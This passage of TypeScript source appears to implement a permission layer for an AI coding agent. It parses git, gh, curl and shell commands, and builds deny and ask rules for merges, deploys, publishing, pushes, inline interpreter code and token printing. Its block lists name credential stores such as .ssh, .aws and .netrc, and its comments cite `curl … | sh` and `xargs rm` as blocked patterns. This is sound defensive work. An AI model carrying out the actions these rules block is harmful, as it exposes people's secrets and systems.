      if (!dir) return false;
      where = where === "." ? dir : path.join(where, dir);
    } else if (a === "--no-pager") continue;
    else break;
  }
  const sub = argv[i];
  const rest = argv.slice(i + 1);
  if (rest.some((a) => GIT_FETCH_UNSAFE.test(a))) return false;
  // Remotes and refspecs only: no local paths, no `ext::`/`file:` transports.
  const plain = rest.filter((a) => !a.startsWith("-"));
  const local = (a: string) => a.includes("::") || /^(file:|\/|~|\.\.?(\/|$))/.test(a);
  const base = resolveIn(scope, where);
  if (base === null) return false;
  const at = { ...scope, cwd: base };
  switch (sub) {
    case "fetch":
    case "pull":
      return plain.every((a) => !local(a)) && insideFolders(scope, where);
    case "clone": {
      const [url, dir, ...extra] = plain;
      if (!url || extra.length > 0 || !/^https:\/\/[^/\s@]+\/\S+$/.test(url)) return false;
      const name =
        dir ??
        url
          .replace(/\/+$/, "")
          .replace(/\.git$/, "")
          .split("/")
          .at(-1) ??
        "";
      return Boolean(name) && insideFolders(at, name);
    }
    default:
      return false;
  }
}

/**
 * gh's subcommands that only print what GitHub has, by group (`gh status` and `gh search …` alone are reads too).
 * Writes, `gh api` (its own deny rule), `gh auth` (the token), extensions and aliases are none of these.
 */
const GH_READS: Record<string, ReadonlySet<string>> = {
  pr: new Set(["view", "diff", "checks", "list", "status"]),
  issue: new Set(["view", "list", "status"]),
  run: new Set(["view", "list", "watch"]),
  workflow: new Set(["view", "list"]),
  repo: new Set(["view", "list"]),
  release: new Set(["view", "list"]),
  project: new Set(["view", "list", "item-list", "field-list"]),
  label: new Set(["list"]),
  gist: new Set(["view", "list"]),
};

/** Read-only gh (`gh pr view 12 --json title`, `gh run list -R a/b`): never `--web`, which opens a browser. */
function readOnlyGh(argv: string[]) {
  const words = ghWords(argv.slice(1));
  // `--web=true` and `-cw` too.
  if (words.some((a) => /^--web(=|$)|^-[a-zA-Z]*w/.test(a))) return false;
  // gh's own jq reads the environment (`$ENV`, `env`), where keys live.
  if (words.some((a) => /^(-q|--jq)/.test(a)) && words.some((a) => /env/i.test(a))) return false;
  const [group = "", sub = ""] = words;
  if (group === "status" || group === "search") return true;
  return GH_READS[group]?.has(sub) === true;
}

function readOnlySimple(s: Simple, scope: CommandScope, plan = false): boolean {
  const [cmd, ...args] = s.argv;
  if (!cmd) return false;
  // A plan turn writes nothing, not even into its own folder.
  if (plan && s.writes.length > 0) return false;
  if (s.writes.some((w) => !insideFolders(scope, w))) return false;
  if (s.reads.some((r) => secretPath(scope, r))) return false;
  // Nothing that reads a secret, wherever it is named.
  if (args.some((a) => !a.startsWith("-") && namesSecret(a, scope))) return false;
  if (READ_ANY.has(cmd)) return true;
  if (READ_WITH_FLAGS.has(cmd)) return !args.some((a) => (WRITE_FLAGS[cmd] as RegExp).test(a));
  switch (cmd) {
    case "find":
      return !args.some((a) => FIND_ACTIONS.test(a));
    case "sips":
      return (
        args.some((a) => a === "-g" || a === "--getProperty") &&
        args.every((a) => !a.startsWith("-") || SIPS_READ.has(a))
      );
    case "exiftool":
      return !args.some((a) => EXIF_WRITE.test(a));
    case "git":
      // A plan turn fetches nothing (a clone or a pull writes into the folder).
      return readOnlyGit(s.argv) || (!plan && fetchIntoFolders(s.argv, scope));
    // Like read-only git, a plan turn may read GitHub too: what a plan needs (the issue, the pull request, its checks).
    case "gh":
      return readOnlyGh(s.argv);
    // No web in a plan turn, not even a GET.
    case "curl":
      return !plan && readOnlyCurl(s.argv, scope);
    case "wget":
      return !plan && readOnlyWget(s.argv, scope);
    // What the computer has and which agents use it: reads /proc, the cgroup tree and /etc only. The full path is
    // system mode's, root's (`SYSTEM_LAUNCHER`).
    case "agentes-runner":
    case "/usr/local/bin/agentes-runner":
      return args.length === 1 && args[0] === "computer";
    default:
      return false;
  }
}

const READ_TOOLS = new Set(["Read", "Glob", "Grep", "LS"]);

/**
 * A call that only reads (or, in a `work` turn, fetches into the mission
 * folder): allowed at once, no card. Every part of a pipeline or list must be
 * read-only, so `curl … | sh` or `ls | xargs rm` never pass. Never a secret.
 */
export function readOnlyCall(
  toolName: string,
  input: Record<string, unknown> | null | undefined,
  scope: CommandScope,
  profile: CommandProfile = "work",
) {
  const i = input ?? {};
  if (READ_TOOLS.has(toolName)) return !secretRead(toolName, i, scope);
  if (toolName !== "Bash") return false;
  const command = typeof i.command === "string" ? i.command : "";
  if (!command.trim() || command.length > 2000) return false;
  const cmds = simpleCommands(command);
  return Boolean(cmds && cmds.length > 0 && cmds.every((s) => readOnlySimple(s, scope, profile === "plan")));
}

/**
 * What a person approves first, by kind, with the words a refusal names it by (ADR 0053 §3, amended
 * 2026-10-30). Never judged and never run alone: Claude Code checks deny before asking, and the runner's
 * prompt tool, its commands and background tasks, and the server refuse a match at once. Pushes aren't
 * here: where one goes depends on the repository, so the computer reads it with git (`gitPushes`).
 */
const SENSITIVE_KINDS: ReadonlyArray<{ what: string; rules: readonly string[] }> = [
  {
    what: "This is a merge",
    rules: ["Bash(git merge)", "Bash(git merge *)", "Bash(git -C * merge *)", "Bash(gh pr merge *)"],
  },
  {
    what: "This is a deploy",
    rules: [
      "Bash(vercel deploy *)",
      "Bash(vercel --prod*)",
      "Bash(vercel * --prod*)",
      "Bash(npx vercel *)",
      "Bash(railway up*)",
      "Bash(railway deploy*)",
      "Bash(npx railway *)",
      "Bash(fly deploy*)",
      "Bash(flyctl deploy*)",
      "Bash(netlify deploy *)",
      "Bash(npx netlify *)",
      "Bash(eas submit *)",
      "Bash(eas update *)",
      "Bash(npx eas *)",
      "Bash(npx eas-cli *)",
      "Bash(kubectl apply *)",
      "Bash(helm install *)",
      "Bash(helm upgrade *)",
      "Bash(terraform apply *)",
    ],
  },
  {
    what: "This is a rollout or a rollback",
    rules: ["Bash(kubectl rollout *)", "Bash(helm rollback *)", "Bash(vercel rollback*)"],
  },
  {
    what: "This removes infrastructure",
    rules: ["Bash(kubectl delete *)", "Bash(helm uninstall *)", "Bash(terraform destroy *)"],
  },
  {
    what: "This publishes a package, an image or a release",
    rules: [
      "Bash(docker push*)",
      "Bash(gh release create*)",
      // `bun publish` and friends; `yarn npm publish` is Yarn 2+.
      "Bash(npm publish*)",
      "Bash(pnpm publish*)",
      "Bash(yarn publish*)",
      "Bash(yarn npm publish*)",
      "Bash(bun publish*)",
      "Bash(cargo publish*)",
      "Bash(gem push*)",
      "Bash(twine upload*)",
    ],
  },
  {
    what: "This calls the GitHub API directly, which can merge, delete or change settings",
    rules: ["Bash(gh api *)"],
  },
];

/** The person's GitHub token, printed: refused like any secret, never asked. */
const TOKEN_RULES: readonly string[] = [
  "Bash(gh auth token*)",
  "Bash(gh auth status *--show-token*)",
  "Bash(gh auth status *-t*)",
];

/** The deny list as Claude Code reads it (`--settings`): every kind above and the token rules. */
export const MISSION_DENY_RULES: readonly string[] = [...SENSITIVE_KINDS.flatMap((k) => k.rules), ...TOKEN_RULES];

/**
 * Every push, for Claude Code's `ask` rules, which outrank allow rules (the owner's own and a project's too): a
 * push reaches our prompt tool, where the computer reads where it goes, also with global options, a path to git,
 * a wrapper or a shell around it (`git --no-pager push`, `/usr/bin/git push`, `env git push`, `sh -c 'git push'`).
 * A command that only mentions one (`grep 'git push'`) asks too, and the prompt tool allows it if it only reads.
 */
export const PUSH_ASK_RULES: readonly string[] = [
  "Bash(git push)",
  "Bash(git push *)",
  "Bash(*git push*)",
  "Bash(*git -* push*)",
];

/**
 * Code given inline to an interpreter (`node -e`, `python3 -c`, `perl -ne`…):
 * never allowed by a settings rule such as `Bash(node *)`, whatever else a
 * profile allows (Claude Code checks deny rules first). Our own check is
 * `inlineCode`, which also catches the spellings these patterns can't.
 */
export const INLINE_CODE_DENY_RULES: readonly string[] = [
  ...["node", "nodejs", "bun"].flatMap((i) =>
    ["-e", "--eval", "-p", "--print"].flatMap((f) => [`Bash(${i} ${f}*)`, `Bash(${i} * ${f} *)`]),
  ),
  ...["python", "python2", "python3"].flatMap((i) => [`Bash(${i} -c*)`, `Bash(${i} * -c *)`]),
  ...["ruby", "perl"].flatMap((i) => [`Bash(${i} -e*)`, `Bash(${i} * -e *)`, `Bash(${i} -*e *)`]),
  "Bash(perl -E*)",
  "Bash(deno eval*)",
  "Bash(php -r*)",
];

/**
 * Credential stores in the person's home (and the system-mode workers' own), named
 * in a shell command: refused by Claude Code itself even where a settings rule
 * allows the command (`Bash(cat *)` in a mission). Our own check is `secretRead`,
 * which covers more.
 */
export const SECRET_BASH_DENY_RULES: readonly string[] = [
  ".ssh",
  ".aws",
  ".gnupg",
  ".kube",
  ".azure",
  ".password-store",
  ".config/gh",
  ".config/gcloud",
  ".agentes-runner",
  path.basename(AGENT_WORKER_HOMES),
  path.basename(GROK_ACCOUNT_HOMES),
  SYSTEM_RUNNER_HOME.slice(1),
  ".git-credentials",
  ".netrc",
  ".pgpass",
  "Library/Keychains",
]
  .flatMap((p) => [`Bash(*~/${p}*)`, `Bash(*/${p}/*)`])
  .concat(HOME_SECRET_DIRS.map((p) => `Bash(*~/${p}*)`))
  // Named from the agent's own folder too, where its commands run.
  .concat(`Bash(*${AGENT_BROWSER_PROFILE}*)`);

/**
 * The same secrets for Claude Code's own read tools (Read, and best effort Glob and Grep), from the
 * lists `SECRET_PATH` is built from: in the home folder and anywhere under the turn's folder. Its rules
 * can't say "every `.env.*` but the example", so the env files are the usual names.
 */
export const SECRET_READ_DENY_RULES: readonly string[] = [
  ...SECRET_DIRS.flatMap((p) => [`Read(~/${p}/**)`, `Read(**/${p}/**)`]),
  ...HOME_SECRET_DIRS.map((p) => `Read(~/${p}/**)`),
  "Read(~/Library/Keychains/**)",
  ...[...SECRET_FILES, ...SECRET_ENV_FILES, ...SECRET_KEY_FILES, ...SECRET_SIGN_IN_FILES].flatMap((p) => [
    `Read(~/${p})`,
    `Read(**/${p})`,
  ]),
];

/** Global options of git before its subcommand that take a value (`git -C <dir> push`, `git -c k=v push`). */
const GIT_GLOBAL_VALUE = new Set([
  "-C",
  "-c",
  "--git-dir",
  "--work-tree",
  "--namespace",
  "--exec-path",
  "--config-env",
  "--attr-source",
]);
/** The same options glued to their value (`--git-dir=<path>`). */
const GIT_GLOBAL_GLUED = /^--(git-dir|work-tree|namespace|exec-path|config-env|attr-source)=/;
const GIT_GLOBAL_FLAG =
  /^(--no-pager|-p|--paginate|-P|--bare|--no-replace-objects|--literal-pathspecs|--glob-pathspecs|--noglob-pathspecs|--icase-pathspecs|--no-optional-locks|--no-advice|--no-lazy-fetch)$/;
/** gh options that pick another repository or host, anywhere in the command. */
const GH_VALUE = new Set(["-R", "--repo", "--hostname"]);
/**
 * gh's words without those options, in each form gh takes (`-R a/b`, `--repo=a/b`, `-Ra/b`): `gh pr -Ra/b merge 1`
 * is a merge.
 */
function ghWords(args: readonly string[]): string[] {
  const out: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i] as string;
    if (GH_VALUE.has(a)) i++;
    else if (!/^--(repo|hostname)=|^-R./.test(a)) out.push(a);
  }
  return out;
}
/** Wrappers that run the next word as the command (`nice -n 5 git push …`, `env -u X git push …`). */
const WRAPPERS = new Set(["command", "builtin", "nice", "nohup", "time", "env", "caffeinate"]);
/** Wrapper options that take the next word. */
const WRAPPER_VALUE = new Set(["-n", "-u", "-C", "-S", "-P", "-w", "-t"]);

/**
 * A program as the system finds it: the last part of its path (either separator), in lower case (Windows' and macOS's
 * file systems ignore it), without Windows' `.exe`, `.com`, `.cmd` or `.bat` (`C:\Windows\System32\REG.exe` → `reg`).
 */
const baseName = (word: string) =>
  (word.split(/[\\/]/).pop() ?? word).toLowerCase().replace(/\.(exe|com|cmd|bat)$/, "");

/**
 * The words with their wrappers (and the wrappers' options and env assignments) left out. Read by an index, sliced
 * once: a slice per wrapper made a long run of them (`nice nice …`) quadratic.
 */
function unwrapped(words: string[]): string[] {
  const argv = words.filter(Boolean);
  let i = 0;
  while (argv.length - i > 1 && WRAPPERS.has(baseName(argv[i] as string))) {
    i++;
    while (argv.length - i > 1 && /^-|^[A-Za-z_][A-Za-z0-9_]*=/.test(argv[i] as string)) {
      i += WRAPPER_VALUE.has(argv[i] as string) && argv.length - i > 2 ? 2 : 1;
    }
  }
  return argv.slice(i);
}

/**
 * One command as the deny list reads it: its program by name (not path),
 * wrappers dropped, git's global options and gh's repository options left
 * out, and `refs/heads/<branch>` read as the branch, so `git -c x=y -C /w push
 * origin refs/heads/main` reads `git push origin main` and `gh -R a/b pr merge 1`
 * reads `gh pr merge 1`.
 */
export function normalizedCommand(words: string[]): string {
  const [first = "", ...rest] = unwrapped(words);
  const cmd = baseName(first);
  const out = [cmd];
  if (cmd === "git") {
    let i = 0;
    for (; i < rest.length; i++) {
      const a = rest[i] as string;
      if (GIT_GLOBAL_VALUE.has(a)) i++;
      else if (GIT_GLOBAL_GLUED.test(a) || GIT_GLOBAL_FLAG.test(a)) continue;
      else break;
    }
    out.push(...rest.slice(i).map((a) => a.replace(/^(\+?)refs\/heads\//, "$1").replace(/:refs\/heads\//, ":")));
  } else if (cmd === "gh") out.push(...ghWords(rest));
  else out.push(...rest);
  return out.join(" ");
}

/** The words of each part of a command (quotes dropped), for matching and showing only: never to run anything. */
export function commandWords(command: string): string[][] {
  const cmds = simpleCommands(command);
  if (cmds) return cmds.map((s) => s.argv);
  return commandParts(command).map((part) => part.split(" ").map(bareWord));
}

/** Rules as tests of one part of a command each, built once (all of the deny list's are `Bash(...)` rules). */
const partTests = (rules: readonly string[]) => rules.map((rule) => partTest(bashPattern(rule) ?? ""));
const TOKEN_TESTS = partTests(TOKEN_RULES);
const KIND_TESTS = SENSITIVE_KINDS.map((k) => ({ what: k.what, tests: partTests(k.rules) }));

/**
 * Why a call is on the deny list, as the refusal tells the agent (`how`: what it can do to ask a person);
 * null when it isn't. The rules match the command as written and each part normalized
 * (`normalizedCommand`), so options in front can't slip past them. Each is cut into its parts once, not once for each
 * rule: code (`approvalNeeded`) asks here for every program its lines name.
 */
export function deniedMessage(
  toolName: string,
  input: Record<string, unknown> | null | undefined,
  how: string = ASK_IN_CHAT,
): string | null {
  const command = commandCall(toolName, input)?.command;
  if (command === undefined) return null;
  const parts = [command, ...commandWords(command).map(normalizedCommand)].flatMap((c) =>
    commandParts(commandOf("Bash", { command: c })),
  );
  const hit = (tests: ReadonlyArray<(part: string) => boolean>) => parts.some((part) => tests.some((t) => t(part)));
  if (hit(TOKEN_TESTS)) return SECRET_MESSAGE;
  const kind = KIND_TESTS.find((k) => hit(k.tests));
  return kind ? approvalMessage(kind.what, how) : null;
}

/** On the deny list: refused at once, never shown to anyone, never judged. */
export const deniedInMissions = (toolName: string, input: Record<string, unknown> | null | undefined) =>
  deniedMessage(toolName, input) !== null;

// ── Merges an agent may do on its own ────────────────────────────────────────

/** A merge the computer may run without a person (`loneMerge`). `dir`: where it runs, from the command's folder. */
export interface LoneMerge {
  dir: string;
  /** `owner/name` as the command names it; null: the folder's remotes say. */
  repo: string | null;
  /** `gh pr merge`'s pull request. */
  pr: number | null;
  /** `git merge`'s branch. */
  ref: string | null;
}

/** What a merge the agent may do on its own touched, for its receipt: `pr` for a pull request, else `ref`. */
export type MergeDone = Pick<LoneMerge, "pr" | "ref"> & { repo: string };

const GITHUB_REPO = /^[A-Za-z0-9_.-]{1,100}\/[A-Za-z0-9_.-]{1,100}$/;

/**
 * `owner/name` of a GitHub repository as a command or a remote writes it (`owner/name`, a github.com URL or its ssh
 * form, our git proxy's URL), or null for anything else, another host included.
 */
export function githubRepo(value: string): string | null {
  const proxied = /\/api\/git\/[0-9a-f-]{36}\/[0-9a-f-]{36}\/(.+)$/i.exec(value.trim())?.[1];
  const repo = (proxied ?? value.trim())
    .replace(/^(https:\/\/|ssh:\/\/git@|git@)?github\.com[/:]/i, "")
    .replace(/\/+$/, "")
    .replace(/\.git$/i, "");
  return GITHUB_REPO.test(repo) ? repo : null;
}

/** gh's options that take a value, and those that don't, of what `loneMerge` lets through. */
const GH_MERGE_VALUE = new Set(["--subject", "-t", "--body", "-b", "--match-head-commit"]);
const GH_MERGE_FLAG = new Set(["--squash", "-s", "--merge", "-m", "--rebase", "-r"]);
const GIT_MERGE_VALUE = new Set(["-m", "--message"]);
const GIT_MERGE_FLAG = new Set(["--no-ff", "--ff", "--ff-only", "--squash", "--no-edit"]);

/**
 * The plain words among these options, read as the program does (an option's value is its value, whatever it looks
 * like), or null at any other option. `named`: where gh's `-R` goes; without it `-R` is one of those others.
 */
function plainWords(
  args: readonly string[],
  flags: ReadonlySet<string>,
  values: ReadonlySet<string>,
  named?: string[],
): string[] | null {
  const plain: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i] as string;
    const glued = named && /^--repo=(.*)$|^-R(.+)$/.exec(a);
    if (named && (a === "-R" || a === "--repo")) named.push(args[++i] ?? "");
    else if (glued) named.push(glued[1] ?? glued[2] ?? "");
    else if (values.has(a)) i++;
    else if (!a.startsWith("-")) plain.push(a);
    else if (!flags.has(a) && !values.has(a.split("=")[0] as string)) return null;
  }
  return plain;
}

const into = (dir: string, to: string) => (path.isAbsolute(to) ? to : path.join(dir, to));

function ghMerge(rest: readonly string[]): Pick<LoneMerge, "repo" | "pr"> | null {
  const named: string[] = [];
  const words = plainWords(rest, GH_MERGE_FLAG, GH_MERGE_VALUE, named);
  if (words?.length !== 3 || words[0] !== "pr" || words[1] !== "merge" || named.length > 1) return null;
  const url = /^(https:\/\/github\.com\/[^/]+\/[^/]+)\/pull\/(\d+)\/?$/.exec(words[2] as string);
  const number = url?.[2] ?? /^\d+$/.exec(words[2] as string)?.[0];
  if (!number) return null;
  const given = [...named, ...(url?.[1] ? [url[1]] : [])].map(githubRepo);
  if (given.some((r) => r === null)) return null;
  // gh goes by the URL; two names that differ leave which repository unknown.
  if (given[1] && given[0]?.toLowerCase() !== given[1].toLowerCase()) return null;
  return { repo: given[0] ?? null, pr: Number(number) };
}

function gitMerge(rest: readonly string[]): { dir: string; ref: string } | null {
  const at = rest[0] === "-C" ? (rest[1] ?? "") : null;
  const words = plainWords(at === null ? rest : rest.slice(2), GIT_MERGE_FLAG, GIT_MERGE_VALUE);
  if (words?.length !== 2 || words[0] !== "merge" || at === "") return null;
  return { dir: at ?? ".", ref: words[1] as string };
}

/**
 * A command or shell script that is one merge and nothing else, the shape the computer may run on its own for a
 * repository the agent was allowed (`mergeRepos`): `gh pr merge <number or URL> [-R owner/name]` or `git merge
 * <branch>` with only the options above, after at most `set -e` lines and a `cd` joined by `&&` (a `cd` that fails
 * must stop the merge). Anything else, or anything this can't follow, is null and waits for a person: `--admin`,
 * `--delete-branch` (agents don't delete branches), `--auto` (nothing merged yet to report), a path to the program,
 * a wrapper, a pipe, a redirection, two merges (one exit code can't say which ran), a word over several lines or
 * opening with `#`, a comment after a command, a line continuation (the words here are the shell's only without
 * those: dropping a comment line can move a closing quote or end a line a continuation goes on, and the shell drops
 * `#5 -R a/b`, so that `gh pr merge --squash #5 -R a/b` merges the folder's own branch).
 */
export function loneMerge(text: string): LoneMerge | null {
  if (/(?:^|[^\\])(?:\\\\)*\\\n/.test(text)) return null;
  const lines = text
    .split("\n")
    .filter((l) => l.trim() && !l.trim().startsWith("#"))
    .join("\n");
  const seen: { comment?: boolean } = {};
  const words = shellWords(lines, seen);
  const cmds = simpleCommands(lines);
  const last = cmds?.at(-1);
  if (!words || seen.comment || !cmds || !last) return null;
  if (cmds.some((s) => s.piped || s.writes.length > 0 || s.reads.length > 0)) return null;
  if (cmds.some((s) => s.argv.some((w) => w.includes("\n") || w.startsWith("#")))) return null;
  if (words.some((w) => w.op === "list" && w.text === "||")) return null;
  let dir = ".";
  for (const { argv } of cmds.slice(0, -1)) {
    if (argv[0] === "cd" && argv.length === 2 && !/^[~-]/.test(argv[1] as string)) {
      dir = into(dir, argv[1] as string);
    } else if (!/^set( -[eux]+| -[eux]*o pipefail)+$/.test(argv.join(" "))) return null;
  }
  if (dir !== "." && words.some((w) => w.op === "list" && w.text !== "&&")) return null;
  const [program, ...rest] = last.argv;
  if (program === "gh") {
    const merge = ghMerge(rest);
    return merge && { dir, ref: null, ...merge };
  }
  const merge = program === "git" ? gitMerge(rest) : null;
  return merge && { repo: null, pr: null, ref: merge.ref, dir: into(dir, merge.dir) };
}

// ── Pushes: where each one goes, read with git on the computer ───────────────

/** One ref a push updates: a branch, `HEAD` (the branch checked out), or null (a bare push: the branch's push target). */
export interface PushRef {
  branch: string | null;
  force: boolean;
  delete: boolean;
}

/** One `git push` of a command, as written. A dry run is none: it changes nothing. */
export interface GitPush {
  /** Where it runs, from the `cd` and `git -C` before it: relative to the command's folder, or absolute. Null: git can't tell (`--git-dir`, `cd ~`). */
  dir: string | null;
  /** The remote or URL it names; null: the branch's own push remote. */
  remote: string | null;
  refs: PushRef[];
  /** `--all`, `--branches` or a wildcard refspec: every branch, the default one too. */
  every: boolean;
  /** `--mirror`: it also overwrites and deletes branches. */
  mirror: boolean;
  /** `--prune`: it deletes the remote branches that aren't here. */
  prune: boolean;
}

/**
 * A line that runs git push somehow, read or not. What follows a `git` stops at the next `git`, which then reads on:
 * the same lines match, and a line of many `git` and no `push` is read once, not once from each.
 */
const PUSH_MENTION = /\bgit\b(?:(?!\bgit\b).)*\bpush\b/;
/** `PUSH_MENTION` across a quoted newline or a line continuation too: a script's line (`shellLines`) may hold either. */
const mentionsPush = (text: string) => PUSH_MENTION.test(text.replace(/\\?\n/g, " "));

/** `cd`'s folder from `dir` (null: git can't tell where that is from here). */
function cdTo(dir: string | null, to: string | undefined) {
  if (to === undefined || to === "-" || to.startsWith("~")) return null;
  if (path.isAbsolute(to)) return to;
  return dir === null ? null : path.join(dir, to);
}

/** A push refspec's destination: a branch, `HEAD`, null (git can't tell), or `skip` (a tag or another kind of ref). */
function pushDestination(dst: string): string | null | "skip" {
  if (dst === "HEAD" || dst === "@") return "HEAD";
  if (dst === "") return null;
  // `heads/<branch>` is git's short form of `refs/heads/<branch>`.
  const head = /^(refs\/)?heads\//.exec(dst)?.[0];
  if (head) return dst.slice(head.length) || null;
  if (dst.startsWith("refs/")) return "skip";
  return dst;
}

/** A push written in a way git may read differently from this: where it goes is unknown. */
const UNREADABLE = "unreadable";
/** A git command that changes the branch checked out: a later bare push or `HEAD` can't be read from git before it runs. */
const MOVES_HEAD = "moves-head";

const movesHead = (sub: string, rest: readonly string[]) =>
  sub === "switch" ||
  // `git checkout -- <file>` only restores files.
  (sub === "checkout" && !rest.includes("--")) ||
  (sub === "branch" && rest.some((a) => /^(-m|-M|--move)$/.test(a))) ||
  (sub === "symbolic-ref" && rest.filter((a) => !a.startsWith("-")).length >= 2);

type PushFlag = "force" | "lease" | "delete" | "dry" | "every" | "mirror" | "prune" | "tags";
/**
 * `git push`'s options (git 2.50) and what each sets here: `repo`, `value` (takes one, the next word unless
 * glued with `=`), `none` (nothing that changes where it goes). Any other spelling, an abbreviation
 * included, is one git may read as anything.
 */
const PUSH_LONG = new Map<string, PushFlag | "repo" | "value" | "none">([
  ["force", "force"],
  ["force-with-lease", "lease"],
  ["delete", "delete"],
  ["dry-run", "dry"],
  // Prints its usage: pushes nothing.
  ["help", "dry"],
  ["all", "every"],
  ["branches", "every"],
  ["mirror", "mirror"],
  ["prune", "prune"],
  ["tags", "tags"],
  ["repo", "repo"],
  ["push-option", "value"],
  ["receive-pack", "value"],
  ["exec", "value"],
  ["recurse-submodules", "value"],
  ...[
    "force-if-includes",
    "set-upstream",
    "follow-tags",
    "atomic",
    "porcelain",
    "progress",
    "thin",
    "verbose",
    "quiet",
    "verify",
    "no-verify",
    "signed",
    "ipv4",
    "ipv6",
  ].map((o): [string, "none"] => [o, "none"]),
]);
const PUSH_SHORT = new Map<string, PushFlag | "value" | "none">([
  ["f", "force"],
  ["d", "delete"],
  ["n", "dry"],
  ["h", "dry"],
  ["o", "value"],
  ...["u", "v", "q", "4", "6"].map((o): [string, "none"] => [o, "none"]),
]);

/** Inline config that changes where a push goes (`push.default`, `remote.<name>.push`, `url.<base>.pushInsteadOf`). */
const PUSH_CONFIG = /^(push|remote|branch|url)\./;
/** git subcommands that run other commands (`git submodule foreach 'git push …'`, `rebase --exec`, `bisect run`). */
const GIT_RUNS_COMMANDS = new Set(["submodule", "rebase", "bisect"]);

/**
 * `git … push …` from its `git` word: where it goes as written; null when it isn't a push or is a dry run;
 * `UNREADABLE` when git may read it otherwise (an option this doesn't know, inline config or an alias);
 * `MOVES_HEAD` for a command that changes the branch checked out.
 */
function parsePush(
  argv: readonly string[],
  dir: string | null,
): GitPush | null | typeof UNREADABLE | typeof MOVES_HEAD {
  let i = 1;
  let where = dir;
  let redirected = false;
  const aliases: string[] = [];
  for (; i < argv.length; i++) {
    const a = argv[i] as string;
    if (a === "-C") where = cdTo(where, argv[++i]);
    else if (a === "--git-dir" || a === "--work-tree") {
      i++;
      where = null;
    } else if (/^--(git-dir|work-tree)=/.test(a)) where = null;
    else if (a === "-c" || a === "--config-env" || a.startsWith("--config-env=")) {
      const setting = a.startsWith("--config-env=") ? a.slice("--config-env=".length) : (argv[++i] ?? "");
      const key = (setting.split("=")[0] ?? "").toLowerCase();
      // An include can set anything, an alias too.
      if (/^include(if)?\./.test(key)) return UNREADABLE;
      if (key.startsWith("alias.")) aliases.push(key.slice("alias.".length));
      else if (PUSH_CONFIG.test(key)) redirected = true;
    } else if (GIT_GLOBAL_VALUE.has(a)) i++;
    else if (GIT_GLOBAL_GLUED.test(a) || GIT_GLOBAL_FLAG.test(a)) continue;
    // A global option this doesn't know may take the next word: what follows can't be read.
    else if (a.startsWith("-")) return argv.includes("push") ? UNREADABLE : null;
    else break;
  }
  const sub = argv[i];
  if (sub === undefined) return null;
  if (aliases.includes(sub.toLowerCase())) return UNREADABLE;
  if (GIT_RUNS_COMMANDS.has(sub)) return mentionsPush(argv.slice(i + 1).join(" ")) ? UNREADABLE : null;
  if (movesHead(sub, argv.slice(i + 1))) return MOVES_HEAD;
  if (sub !== "push") return null;
  if (redirected) return UNREADABLE;
  const set: Record<PushFlag, boolean> = {
    force: false,
    lease: false,
    delete: false,
    dry: false,
    every: false,
    mirror: false,
    prune: false,
    tags: false,
  };
  let repo: string | null = null;
  const words: string[] = [];
  // Every option is read, the last one winning as in git (`--dry-run --no-dry-run` pushes).
  for (let j = i + 1; j < argv.length; j++) {
    const a = argv[j] as string;
    if (a === "--" || a === "--end-of-options") {
      words.push(...argv.slice(j + 1));
      break;
    }
    if (a.startsWith("--")) {
      const eq = a.indexOf("=");
      const name = eq < 0 ? a.slice(2) : a.slice(2, eq);
      // `--no-<option>` undoes it (`--no-verify` is an option of its own).
      const negated = !PUSH_LONG.has(name) && name.startsWith("no-");
      const what = PUSH_LONG.get(negated ? name.slice(3) : name);
      if (what === undefined) return UNREADABLE;
      if (what === "repo" || what === "value") {
        const value = negated ? null : eq < 0 ? (argv[++j] ?? null) : a.slice(eq + 1);
        if (what === "repo") repo = value;
      } else if (what !== "none") set[what] = !negated;
      continue;
    }
    if (a.startsWith("-") && a.length > 1) {
      for (let k = 1; k < a.length; k++) {
        const what = PUSH_SHORT.get(a[k] as string);
        if (what === undefined) return UNREADABLE;
        if (what === "value") {
          if (k === a.length - 1) j++;
          break;
        }
        if (what !== "none") set[what] = true;
      }
      continue;
    }
    words.push(a);
  }
  if (set.dry) return null;
  const [remote = repo, ...specs] = words;
  const force = set.force || set.lease || set.mirror;
  const push: GitPush = {
    dir: where,
    remote,
    refs: [],
    every: set.every || set.mirror,
    mirror: set.mirror,
    prune: set.prune,
  };
  for (let k = 0; k < specs.length; k++) {
    const spec = specs[k] as string;
    if (spec === "tag") {
      k++;
      continue;
    }
    const plus = spec.startsWith("+");
    const bare = plus ? spec.slice(1) : spec;
    const colon = bare.indexOf(":");
    const dst = colon < 0 ? bare : bare.slice(colon + 1);
    // A wildcard, or `:` alone: every branch (both sides have), the default one too.
    if (dst.includes("*") || bare === ":") {
      push.every = true;
      continue;
    }
    const branch = pushDestination(dst);
    if (branch === "skip") continue;
    push.refs.push({ branch, force: force || plus, delete: set.delete || (colon === 0 && dst !== "") });
  }
  // No refspec: the branch's own push target (`--tags` alone pushes tags only).
  if (specs.length === 0 && !push.every && !set.tags) push.refs.push({ branch: null, force, delete: set.delete });
  return push;
}

/** Shells whose `-c` script is read like lines of its own (`bash -lc 'cd app && git push origin fix'`). */
const SHELL_NAMES = /^(sh|bash|zsh|dash|ksh)$/;
/** Shell keywords and programs that run the rest of their words as a command, as written: a `git` word among them starts it. */
const PASS_THROUGH = new Set([
  "if",
  "then",
  "else",
  "elif",
  "do",
  "while",
  "until",
  "!",
  "exec",
  "timeout",
  "sudo",
  "doas",
]);
/** Programs that only read or print: words naming git push there run nothing. */
const printsOnly = (cmd: string) => READ_ANY.has(cmd) || READ_WITH_FLAGS.has(cmd) || cmd === "gh";
/** A command that runs text its words don't show: piped into an interpreter (`… | sh`), or built by `xargs`. */
const runsText = (cmd: string, words: readonly string[], piped: boolean) =>
  cmd === "xargs" ||
  (piped &&
    /^(sh|bash|zsh|dash|ksh|fish|python[\d.]*|node|bun|deno|ruby|perl|php)$/.test(cmd) &&
    words.slice(1).every((w) => w.startsWith("-")));

/**
 * The pushes a command or a shell script makes, line by line (`cd` and `git -C` followed, wrappers skipped, a
 * shell's `-c` script read too); null when a push can't be read plainly (`$(…)`, variables, heredocs, an
 * option git may read otherwise, another program that runs it: `xargs`, `eval`, `sudo sh -c`, `… | sh`; a
 * bare push or `HEAD` after a checkout in the same command): where it goes is unknown.
 */
export function gitPushes(script: string): GitPush[] | null {
  const read = { pushes: [] as GitPush[], moved: false };
  return readPushes(script, "", read) ? read.pushes : null;
}

/** `gitPushes` for a script that starts in `from`, into `read` (a shell's `-c` script shares it); false: unreadable. */
